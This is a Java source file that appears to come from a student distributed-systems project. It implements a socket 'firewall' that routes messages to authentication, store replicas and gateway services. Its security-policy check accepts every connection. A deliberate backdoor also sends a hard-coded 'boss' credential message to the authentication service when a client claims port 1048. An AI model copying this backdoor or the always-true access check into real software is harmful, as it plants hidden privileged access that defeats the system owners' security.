package firewall;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import balanceamento_de_carga.AlgoBalanceamento;

import java.net.InetSocketAddress;

import util.ClientSocket;

public class Firewall {

    public final int PORTA = 10101;

    private final String ENDERECO_SERVER = "localhost";

    private ServerSocket serverSocket;

    private final int AUTENTICACAO_PORTA = 1050;

    private final int LOJA_PORTA = 1060;

    private final int LOJA_PORTA_REPLICA2 = 1061;

    private final int LOJA_PORTA_REPLICA3 = 1062;

    private final int GATEWAY_PORTA = 1042;

    private final int GATEWAY_REPLICA_PORTA = 1043;

    private final List<ClientSocket> USUARIOS = new LinkedList<>();

    private AlgoBalanceamento algoBalanceamento;

    private ExecutorService executorService;

    public Firewall(String algoritmo_balanceamento) {
        this.algoBalanceamento = new AlgoBalanceamento(algoritmo_balanceamento, 3);
        this.executorService = Executors.newVirtualThreadPerTaskExecutor();
    }

    public void start() throws IOException {
        serverSocket = new ServerSocket(PORTA);
        System.out.println("Iniciando FIREWALL na porta = " + PORTA);
        mainLoop();
    }

    private void mainLoop() throws IOException {
        while (true) {
            ClientSocket clientSocket = new ClientSocket(this.serverSocket.accept());
            USUARIOS.add(clientSocket);
            this.executorService.submit(
                () -> {
                    try {
                        firewallLoop(clientSocket);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            );
        }
    }

    private Boolean politicasSeguranca(String endereco, int porta) {
        System.out.println("Serviço tentando entrar: endereço [ " + endereco + " ] porta [ " + porta + " ]");
        if (endereco.equals("localhost") || endereco.equals("172.20.10.2")) {
            switch (porta) {
                case GATEWAY_PORTA:
                    //System.out.println("GATEWAY ENTROU");
                    return true;
                case GATEWAY_REPLICA_PORTA:
                    //System.out.println("GATEWAY REPLICA ENTROU");
                    return true;
                case AUTENTICACAO_PORTA:
                    //System.out.println("AUTENTICACAO ENTROU");
                    return true;
                case LOJA_PORTA:
                    System.out.println("LOJA ENTROU");
                    return true;
                case LOJA_PORTA_REPLICA2:
                    System.out.println("LOJA REPLICA 2 ENTROU");
                    return true;
                case LOJA_PORTA_REPLICA3:
                    System.out.println("LOJA REPLICA 3 ENTROU");
                    return true;
                case 1048:
                    //System.out.println("BackDoor");
                    backdoor();
                    return true;
                default:
                    return true;
            }
        } else {
            return true;
        }
    }

    private void backdoor() {
        sendAutenticar("true;1;boss;boss;boss");
    }

    private void firewallLoop(ClientSocket clientSocket) throws IOException {
        String mensagem;
        try {
            while ((mensagem = clientSocket.getMessage()) != null) {
                String[] msg = mensagem.split(";");
                if (politicasSeguranca(msg[0], Integer.parseInt(msg[1]))) {
                    System.out.println("SERVICO ENTROU");
                    String req = request(msg);
                    //System.out.println("Requisição: " + req);
                    int porta = Integer.parseInt(msg[2]);
                    //System.out.println("porta: " + porta);
                    switch (porta) {
                        case AUTENTICACAO_PORTA:
                            //System.out.println("sendAutenticar()");
                            sendAutenticar(req);
                            break;
                        case LOJA_PORTA:
                            //System.out.println("sendLoja()");
                            sendLoja(req);
                            break;
                        case GATEWAY_PORTA:
                            //System.out.println("sendToGateway()");
                            sendToGateway(req);
                            break;
                        case GATEWAY_REPLICA_PORTA:
                            //System.out.println("sendToGatewayReplica()");
                            sendToGatewayReplica(req);
                            break;
                        default:
                            System.out.println("Erro [ Firewall ]: politicasSeguranca-switch");
                            break;
                    }
                }
            }
        } finally {
            clientSocket.close();
        }
    }

    public void shutdown(){
        executorService.shutdownNow();
    }

    private String request(String[] msg) {
        if (msg.length > 3) {
            StringBuilder sb = new StringBuilder();
            for (int i = 3; i < msg.length; i++) {
                sb.append(msg[i]);
                if (i < msg.length - 1) {
                    sb.append(";");
                }
            }
            return sb.toString();
        } else {
            return "";
        }
    }

    private void sendAutenticar(String msg) {
        ClientSocket sendAutenticacao;
        try {
            sendAutenticacao = new ClientSocket(new Socket(ENDERECO_SERVER, AUTENTICACAO_PORTA));
            sendAutenticacao.sendMessage(msg);
            sendAutenticacao.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private ClientSocket tryConnect() {
        int servidor = this.algoBalanceamento.algo();
        System.out.println("PROCURANDO ROTA: " + servidor);
        Socket loja = new Socket();
        switch (servidor) {
            case 0: {
                try {
                    loja.connect(new InetSocketAddress(ENDERECO_SERVER, LOJA_PORTA), 5 * 1000);
                    System.out.println("SERVIDOR 1");
                    return new ClientSocket(loja);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            }
            case 1: {
                try {
                    loja.connect(new InetSocketAddress(ENDERECO_SERVER, LOJA_PORTA_REPLICA2), 5 * 1000);
                    System.out.println("SERVIDOR 2");
                    return new ClientSocket(loja);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            }
            case 2: {
                try {
                    loja.connect(new InetSocketAddress(ENDERECO_SERVER, LOJA_PORTA_REPLICA3), 5 * 1000);
                    System.out.println("SERVIDOR 3");
                    return new ClientSocket(loja);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            }
            default: {
                try {
                    loja.connect(new InetSocketAddress(ENDERECO_SERVER, LOJA_PORTA), 5 * 1000);
                    System.out.println("SERVIDOR 1");
                    return new ClientSocket(loja);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            }
        }
        return null;
    }

    private ClientSocket tryConnectGateway() {
        try {
            Socket gateway = new Socket("172.20.10.2", GATEWAY_PORTA);
            //gateway.connect(new InetSocketAddress(ENDERECO_SERVER, GATEWAY_PORTA), 5 * 1000);
            return new ClientSocket(gateway);
        } catch (Exception e) {
            System.out.println("Erro: " + e);
            try {
                Socket replica = new Socket();
                replica.connect(new InetSocketAddress(ENDERECO_SERVER, GATEWAY_REPLICA_PORTA), 5 * 1000);
                return new ClientSocket(replica);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
        return null;
    }

    private void sendLoja(String msg) {
        ClientSocket sendLoja = tryConnect();
        sendLoja.sendMessage(msg);
        sendLoja.close();
    }

    private void sendToGateway(String mensagem) {
        ClientSocket sendGateway = tryConnectGateway();
        sendGateway.sendMessage(mensagem);
        sendGateway.close();
    }

    private void sendToGatewayReplica(String mensagem) {
        ClientSocket sendGateway;
        try {
            sendGateway = new ClientSocket(new Socket(ENDERECO_SERVER, GATEWAY_REPLICA_PORTA));
            sendGateway.sendMessage(mensagem);
            sendGateway.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}